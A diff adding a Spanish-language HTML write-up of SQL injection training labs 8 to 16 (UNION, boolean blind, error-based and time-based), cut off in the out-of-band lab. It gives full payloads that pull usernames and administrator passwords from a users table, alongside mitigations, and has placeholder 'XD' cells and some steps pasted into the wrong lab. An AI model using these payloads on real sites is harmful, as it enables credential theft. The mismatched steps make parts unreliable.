+                        <p>Implementar Consultas Preparadas (Parameterized Queries): Al usar parámetros en lugar de concatenar cadenas, los valores inyectados por el usuario se tratan como simples datos y no como parte del código SQL.</p>
+                        <p>Gestión de Errores Controlada: Configurar la aplicación para que no muestre mensajes de error detallados al usuario.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla8">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab08: SQL injection UNION attack, finding a column containing text</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>SQL Injection UNION-based (con prueba de tipo de datos)</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Descubrir qué columna(s) son compatibles con datos de tipo string.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>El parámetro de categoría de productos se concatena directamente en la consulta SQL sin validación ni sanitización y la aplicación devuelve los resultados directamente en la respuesta.</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Entrar a una categoría en la página e interceptar la request
+                          </li>
+                          <li>
+                            Cambiamos el valor de category a ’+UNION+SELECT+’abcdef’,NULL,NULL—-‘, primeramente, nos marcará error.
+                          </li>
+                          <li>
+                            Dado el caso que da error, volvemos a escribir todos los parámetros como NULL y pasamos a la siguiente columna para escribir el texto ’abcdef’ intercambiandolo con otro NULL
+                          </li>
+                          <li>
+                            Recorremos la response y encontramos que podemos extraer un texto en específico.
+                          </li>
+                          <li>
+                            En la request escribimos eso en la columna correspondiente.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: ' UNION SELECT ‘abcdef’,NULL,NULL--
+                        <ul>
+                          <li>': Cierra la cadena de la categoría original.</li>
+                          <li>UNION SELECT: Combina los resultados de la consulta legítima con los de nuestra consulta maliciosa.</li>
+                          <li>NULL,NULL: Cada NULL representa una columna ficticia. Se usan porque son valores “universales” que no generan conflictos de tipo</li>
+                          <li>NULL: Se usa para completar el número de columnas requerido (ya que la consulta original tiene 2 columnas, nuestra unión debe tener 2).</li>
+                          <li>--: Comenta el resto de la consulta original para evitar errores de sintaxis.</li>
+                          <li>'abcdef': Se coloca en la primera columna para probar si esa columna acepta datos de tipo string.</li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Principio de Menor Privilegio: La cuenta de base de datos utilizada por la aplicación debe tener permisos mínimos. Solo debe acceder a las tablas necesarias para mostrar productos y categorías.</p>
+                        <p>Validación Estricta de Entradas: El parámetro de categoría debe aceptar únicamente valores válidos predefinidos</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla9">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab09: SQL injection UNION attack, retrieving data from other tables</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>SQL Injection UNION-based (data extraction)</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Obtener todos los usernames y passwords de la tabla users.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>El parámetro de categoría de productos se concatena directamente en la consulta SQL sin validación ni sanitización, permitiendo modificar la consulta original y unirla con otra que consulta la tabla users.</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Entrar a una categoría en la página e interceptar la request
+                          </li>
+                          <li>
+                            Escribimos  category=’+UNION+SELECT+’abc’,’def’-— para comprobar que columnas admiten datos de tipo texto.
+                          </li>
+                          <li>
+                            Cambiamos la request por ’+UNION+SELECT+username,password+FROM+users— para obtener a los usuarios. Buscamos en la response los usuarios y tomamos las credenciales del administrador.
+                          </li>
+                          <li>
+                            En la pagina entramos a My account e ingresamos las credenciales obtenidas.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: ’+UNION+SELECT+username,password+FROM+users—
+                        <ul>
+                          <li>': Cierra la cadena de la categoría original.</li>
+                          <li>UNION SELECT: Combina los resultados de la consulta legítima con los de nuestra consulta maliciosa.</li>
+                          <li>username,password: Se colocan las columnas de la tabla users que queremos extraer.</li>
+                          <li>--: Comenta el resto de la consulta original para evitar errores de sintaxis.</li>
+                          <li>FROM users: Indica la tabla objetivo que contiene las credenciales.</li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Uso de Consultas Preparadas (Parameterized Queries):  Evita que el input del usuario se interprete como código SQL. Los parámetros se tratan como datos, bloqueando la posibilidad de inyectar un UNION SELECT.</p>
+                        <p>Principio de Menor Privilegio:  La cuenta de base de datos usada por la aplicación no debe tener permisos para leer tablas sensibles como users.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla10">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab10: SQL injection UNION attack, retrieving multiple values in a single column</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>SQL Injection UNION-based (extracción de múltiples valores en una sola columna)</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Extraer los nombres de usuario y contraseñas almacenados en la tabla users mediante un ataque SQL Injection basado en UNION, combinando múltiples valores en una sola columna para poder visualizar la información en la respuesta de la aplicación.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>El filtro de categorías de productos concatena directamente el parámetro category dentro de una consulta SQL sin realizar validación ni sanitización.</p>
+                        <p>Esto permite cerrar la cadena original y utilizar el operador UNION SELECT para combinar la consulta legítima con otra consulta maliciosa que accede a la tabla users, donde se encuentran almacenadas las credenciales de los usuarios.</p>
+                        <p>
+                          Además, la aplicación solo muestra una columna de texto en la respuesta, por lo que es necesario concatenar los valores de username y password en una sola columna para poder visualizar ambas informaciones.
+                        </p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Acceder al laboratorio y seleccionar cualquier categoría de productos. 
+                          </li>
+                          <li>
+                            Interceptar la petición HTTP mediante Burp Suite usando la herramienta Proxy.
+                          </li>
+                          <li>
+                            Enviar la petición al Repeater y modificar el parámetro category para comprobar el número de columnas con: ' UNION SELECT NULL,NULL--
+                          </li>
+                          <li>
+                            Confirmar que ambas columnas aceptan texto probando con valores de prueba.
+                          </li>
+                          <li>
+                            Construir un payload que combine el username y el password en una sola columna usando la función CONCAT().
+                          </li>
+                          <li>
+                            Inyectar el payload: ' UNION SELECT CONCAT(username,':',password),NULL FROM users—
+                          </li>
+                          <li>
+                            En la respuesta HTTP aparecerán las credenciales de los usuarios.
+                          </li>
+                          <li>
+                            Localizar las credenciales del usuario administrator e iniciar sesión con ellas para resolver el laboratorio.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: ' UNION SELECT CONCAT(username,':',password),NULL FROM users—
+                        <ul>
+                          <li>': Cierra la cadena de la categoría original.</li>
+                          <li>UNION SELECT: Combina los resultados de la consulta legítima con los de nuestra consulta maliciosa.</li>
+                          <li>CONCAT(username,':',password): Concatena el nombre de usuario y la contraseña en una sola cadena.</li>
+                          <li>NULL: Se usa para completar el número de columnas requerido (ya que la consulta original tiene 2 columnas, nuestra unión debe tener 2).</li>
+                          <li>FROM users: Especifica la tabla que contiene las credenciales.</li>
+                          <li>--: Comenta el resto de la consulta original para evitar errores de sintaxis.</li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Implementar consultas parametrizadas (Prepared Statements).</p>
+                        <p>Validar estrictamente los parámetros recibidos por la aplicación.</p>
+                        <p>Aplicar el principio de mínimo privilegio a la cuenta de base de datos utilizada por la aplicación.</p>
+                        <p>Evitar mostrar datos directamente provenientes de consultas SQL sin procesar.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla11">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab11: Blind SQL injection with conditional responses</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>Blind SQL Injection (Boolean-based)</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Comprender cómo un atacante puede extraer información de la base de datos cuando la aplicación no muestra directamente los resultados de las consultas SQL, utilizando respuestas condicionales del servidor.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>La aplicación utiliza una cookie llamada TrackingId que se incluye directamente dentro de una consulta SQL sin validación.</p>
+                        <p>Aunque la aplicación no devuelve errores ni resultados de la consulta en la respuesta HTTP, sí presenta cambios en el contenido de la página dependiendo de si una condición SQL es verdadera o falsa.</p>
+                        <p>
+                          Esto permite realizar una inyección SQL ciega basada en booleanos, donde el atacante envía consultas que generan condiciones verdaderas o falsas y analiza la respuesta de la aplicación.
+                        </p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        Nota: En este laboratorio no es necesario utilizar funciones avanzadas como Burp Collaborator. El ataque se basa en observar cambios en la respuesta de la aplicación cuando una condición SQL es verdadera o falsa.
+                        <ol>
+                          <li>
+                            Acceder al laboratorio y abrir Burp Suite, activando la opción Intercept en la pestaña Proxy para capturar las peticiones HTTP enviadas por el navegador
+                          </li>
+                          <li>
+                            Interactuar con la página (por ejemplo seleccionando una categoría de productos) para interceptar una petición. En la solicitud interceptada se puede observar una cookie llamada TrackingId, la cual será el punto de inyección.
+                          </li>
+                          <li>
+                            Enviar la petición interceptada al Repeater para poder modificarla manualmente y probar diferentes payloads de SQL Injection.
+                          </li>
+                          <li>
+                            . Probar una condición booleana verdadera modificando el valor de la cookie TrackingId con un payload como:
+
+                            TrackingId=xyz' AND '1'='1
+                            y observar que la página muestra el mensaje “Welcome back”, indicando que la condición es verdadera.
+                          </li>
+                          <li>
+                            Probar una condición falsa modificando el payload a:
+                            TrackingId=xyz' AND '1'='2
+                            En este caso el mensaje “Welcome back” desaparece, lo que confirma que la consulta SQL está siendo evaluada por la base de datos.
+                          </li>
+                          <li>
+                            Utilizar consultas condicionales para verificar la existencia del usuario administrator mediante una subconsulta SQL.
+                          </li>
+                          <li>
+                            En la respuesta HTTP aparecerán las credenciales de los usuarios.
+                          </li>
+                          <li>
+                            Finalmente, mediante múltiples consultas booleanas y observando las diferencias en la respuesta del servidor, se puede inferir información sensible de la base de datos, como la longitud y los caracteres de la contraseña del usuario administrador.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">La vulnerabilidad puede identificarse observando cambios en la respuesta de la aplicación, por ejemplo, cuando aparece o desaparece un mensaje como:
+                        <b>Welcome back</b>
+                        dependiendo de si la condición SQL inyectada es verdadera o falsa.
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: ' AND '1'='1
+                        <ul>
+                          <li>': Cierra la cadena de la categoría original.</li>
+                          <li>AND
+                            Permite agregar una condición adicional a la consulta SQL.
+                          </li>
+                          <li>'1'='1'
+                            Es una condición booleana que siempre es verdadera.
+                          </li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Uso de consultas parametrizadas.</p>
+                        <p>Validación estricta de las entradas del usuario.</p>
+                        <p>Implementación de Web Application Firewalls (WAF) para detectar patrones de inyección</p>
+                        <p>Evitar que parámetros provenientes del cliente se concatenen directamente en consultas SQL.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla12">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab12: Blind SQL injection with conditional errors</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>Blind SQL Injection Boolean-based con extracción de información</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Extraer la contraseña del usuario administrator utilizando una técnica de SQL Injection ciega basada en respuestas condicionales.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>La cookie TrackingId es vulnerable a inyección SQL.</p>
+                        <p>La aplicación no muestra directamente los resultados de las consultas, pero cambia el contenido de la página dependiendo de si la condición SQL es verdadera o falsa.</p>
+                        <p>
+                          Esto permite a un atacante realizar múltiples consultas booleanas para descubrir la contraseña del usuario administrador carácter por carácter.
+                        </p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Interceptar la petición HTTP mediante Burp Suite Proxy.
+                          </li>
+                          <li>
+                            Identificar la cookie vulnerable
+                          </li>
+                          <li>
+                            Confirmar la vulnerabilidad probando condiciones booleanas como:
+                            ' AND '1'='1
+                            Y
+                            ' AND '1'='2
+                          </li>
+                          <li>
+                            Determinar la longitud de la contraseña del usuario administrator utilizando consultas SQL.
+                          </li>
+                          <li>
+                            Utilizar la función SUBSTRING() para comparar cada carácter de la contraseña
+                          </li>
+                          <li>
+                            Automatizar el proceso mediante Burp Intruder, probando caracteres alfanuméricos.
+                          </li>
+                          <li>
+                            Cuando la respuesta del servidor muestre el mensaje Welcome back, se confirma que el carácter probado es correcto.
+                          </li>
+                          <li>
+                            Repetir el proceso para cada posición hasta obtener la contraseña completa.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">La vulnerabilidad se confirma cuando se logra reconstruir la contraseña del usuario administrator.
+                      Una vez obtenida, se introduce en el formulario de login y el laboratorio se marca como solved
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
+                        <ul>
+                          <li>': Cierra la cadena de la categoría original.</li>
+                          <li>AND
+                            Permite agregar una condición adicional a la consulta SQL.
+                          </li>
+                          <li>SUBSTRING()
+                            Extrae un carácter específico de la contraseña.
+                          </li>
+                          <li>
+                            (SELECT password FROM users WHERE username='administrator')
+                            Consulta que obtiene la contraseña del usuario administrador
+                          </li>
+                          <li>
+                            'a'
+                            Carácter que se está probando.
+                          </li>
+                          <li>
+                            Si el carácter coincide, la aplicación muestra una respuesta diferente que permite identificarlo.
+                          </li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Validación estricta de entradas del usuario.</p>
+                        <p>Implementación de controles de seguridad para evitar inferencias basadas en respuestas condicionales.</p>
+                        <p>Configuración segura de la base de datos siguiendo el principio de mínimo privilegio.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla13">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab13: Visible error based SQL injection</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>Visible error based SQL injection</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Obtener todos los usernames y passwords de la tabla users.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Al introducir queries de SQL en la cookie TrackingId, se pueden obtener errores que ayudan a modificar esta query para hacerla funcionar y poder obtener el user y el password de administrator</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Se utiliza el interceptor de burpsuite para poder ingresar a los paquetes enviados de la pagina
+                          </li>
+                          <li>
+                            Se puede observar que la pagina tiene una cookie llamada TrackingId, ya que es una cookie personalizada, sabemos que se puede utilizar SQL Injection para poder obtener información de esta Se manda a repetidor y se escribe una comilla después de la cookie.
+                          </li>
+                          <li>
+                            Cambiamos la request por ’+UNION+SELECT+username,password+FROM+users— para obtener a los usuarios. Buscamos en la response los usuarios y tomamos las credenciales del administrador.
+                          </li>
+                          <li>
+                            Con esta comilla, obtenemos el error en la pagina que nos muestra la consulta de SQL que estamos haciendo, como en el error dice que esperaba un carácter en el query, introducimos dashes para que no lea lo que esta después de la comilla y modificamos esta consulta para que tenga un carácter
+                          </li>
+                          <li>
+                            Vemos que con los dashes no muestra error, entonces podemos utilizar otras funciones para poder conseguir mas errores y modificar nuestra consulta. Utilizamos la función CAST para modificar el tipo de datos de la query a entero
+                          </li>
+                          <li>
+                            Al hacer esta query, y modificarla con URL ENCODER, se puede ver que nos muestra un error en el cual nos pide un carácter tipo BOLEANO, y modificamos nuestra query para que tenga un 1 al inicio de CAST
+                          </li>
+                          <li>
+                            Esta query esta correcta, entonces podemos modificar nuestra consulta de SELECT para pedir los datos de la tabla de usuarios
+                          </li>
+                          <li>
+                            Nos muestra un error que dice UNTERMINATED STRING starting AT, este error nos dice que termino el string después de tal carácter y tiene un límite, entonces necesitamos modificar nuestra query para quedar dentro del límite. 
+                          </li>
+                          <li>
+                            Ahora nos muestra que no puede mostrar todos los usuarios de la tabla de SQL, entonces introducimos el comando LIMIT para saber el primer usuario de la tabla, que normalmente es el usuario Admin
+                          </li>
+                          <li>
+                            Con este error, sabemos que el primer usuario es el de administrador, entonces modificamos el query para pedir la PASSWORD en vez del usuario
+                          </li>
+                          <li>
+                            Con este query nos dio la contraseña del usuario administrador, ahora lo introducimos al login para terminal el laboratorio
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Con las consultas de SQL, pudimos obtener errores directamente de la pagina que nos decia como modificar dicha consulta para poder obtener informacion valiosa del administrador, ingresamos el and para ingresar otra consulta despues de la cookie, con el CAST cambiamos de string a entero, pero ingresamos un 1 al inicio para hacerla boleana, despues ingresamos la consulta de password dentro de el cast a la tabla de users, con un limite porque al ver los errores no nos permitia ver todos los usuarios, al confirmar que el primer usuario es el administrador, pudimos obtener la password del primer usuario con esta consulta</p>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Modificar la pagina para que cuando se haga una consulta que se sabe que es inyeccion de sql, mostrar que no esta permitido en lugar de mostrar el error directamente</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla14">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab14: Blind SQL injection with time delays</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>Blind SQL injection with time delays</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Introducir un comando que haga un delay en la pagina para observar si se puede realizar una inyección de sql</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Utilizar las consultas de SQL de delay de tiempo para poder ver si se puede realizar una inyección de sql para obtener informacion</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Se manda la pagina al repetidor de BurpSuite y se observa la cookie de TrackingId
+                          </li>
+                          <li>
+                            A esta cookie, le ingresamos una comilla al final para terminar la consulta de la cookie e ingresamos || para concatenar nuestra consulta
+                          </li>
+                          <li>
+                            En el mismo burpsuite se visualiza que esta consulta no funciono, ya que tomo menos de 1 segundo en cargar, entonces introducimos diferentes consultas para ver cual tipo de consultas recibe
+                          </li>
+                          <li>
+                            Intentamos ahora ingresar el comando para postgre SQL, el cual se escribe PG_SLEEP en lugar de solo sleep
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: bhNp4lunWxP91zK6'+||+(SELECT+pg_sleep(10))—
+                        <p>La primera cadena es la cookie de tracking id, la cual terminamos con nuestra comilla, despues ingresamos || para concatenar nuestra consulta a esa cookie, ingresamos la consulta select pg sleep para poder poner un delay de 10 segundos, pg sleep es el delay de lenguaje postgre sql, select sleep no funciono por esta razon</p>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Se introduce una condiconal en la cual si se realiza una consulta SQL , no puedan ser aceptadas</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla15">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab15: Blind SQL injection with time delays and information retrieval</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>SQL Injection with time delay and information retrieval</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Obtener información con las consultas de sql utilizando el time delay y el intruder para comprobar el tamaño y los caracteres de la contraseña del administrador</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Comprobacion de consultas utilizando el time delay como condicionales</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Se introduce la pagina al burpsuite en interceptor para comprobar si el query de time delay funciona
+                          </li>
+                          <li>
+                            Al ver que si funciono, introducimos nuevas consultas e utilizamos el time delay como condicional para comprobar si funciona
+                          </li>
+                          <li>
+                            Como comprobamos que si funciono con el uso de un CASE, podemos introducir consultas para comprobar que existe la tabla de users con un nombre de administrador 
+                          </li>
+                          <li>
+                            Ahora sabemos que la tabla de users existe con un usuario llamado administrador, ahora modificamos el query para poder saber la longitud de la contraseña de dicho administrador
+                          </li>
+                          <li>
+                            Con estas consultas, sabemos que la contraseña del administrador es de 20 caracteres, ahora utilizamos el intruder para saber con cual carácter empieza esta contraseña, modificamos el query para utilizar SUBSTRING para comprobar si el carácter con el que empieza es el mismo que introducimos, esto lo mandamos al intruder
+                          </li>
+                          <li>
+                            Configuramos el intruder de la siguiente manera, colocando un payload en nuestro carácter que queremos conocer 
+                          </li>
+                          <li>
+                            Utilizando el resource pool custom de 1 para poder probar cada carácter sin modificar nuestro time delay
+                          </li>
+                          <li>
+                            Se puede observar como el primer carácter de la contraseña es 8
+                            Ahora se realiza lo mismo para poder saber el siguiente carácter y así se realizará para los otros 20 caracteres
+                          </li>
+                          <li>
+                            Con este setup, podemos averiguar cada carácter de la contraseña alfanumérica en cada posición, obvio al usar burpsuite intruder se tardaría, 
+                          </li>
+                          <li>
+                            Si armamos la contraseña con los caracteres que tuvieron delay al ser comparados en la tabla de contraseñas, obtuvimos esta contraseña
+                            Si la introducimos en la cuenta de administrador en el login aparece que es correcta
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: ' || (SELECT case when(username='administrator' and substring(password,1,1)='a') then pg_sleep(2) else pg_sleep(-1) END from users)—
+                        <p>Utilizamos el select case para hacer una condicional, en el case usamos el when, que permite realizar una accion cuando una condicion se cumple, esta condicion dice que si usamos el usuario administrador, nos dira cada carácter dentro de la contraseña del administrador, ya que si esta condicion se cumple, este hara un delay en la pagina de 2 segundos y con esto, podemos revisar cada vez que esta condicion se cumplio para obtener la contraseña</p>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Al igual que la anterior inyeccion sql, esta se puede mitigar previniendo una introduccion de consultas SQL al codigo y previniendo que sean aceptadas</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla16">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab16: Blind SQL injection with out-of-band interaction</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>Blind SQL injection (Out-of-band / OAST).</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Provocar una interacción de red externa (DNS) mediante una subconsulta SQL.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>La cookie TrackingId es vulnerable a inyección. El servidor no devuelve errores ni cambios en el contenido, pero procesa comandos que permiten invocar funciones de red.</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Nota: Al requerir de la versión Professional de Burp Suite (elemento con el cual no contamos), no se pueden adjuntar las evidencias prácticas (capturas), pero si podemos explicar el procedimiento teórico.</p>
+                        <ol>
+                          <li>
+                            Interceptar la petición con Burp Proxy. 
